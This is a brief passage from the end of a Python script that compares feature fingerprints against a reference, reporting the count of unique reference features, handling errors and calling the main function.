        print(f"Unique to Reference: {len(ref_features - current_features)}")
        
    except Exception as e:
        print(f"[-] Error comparing fingerprints: {e}")

if __name__ == "__main__":
    main()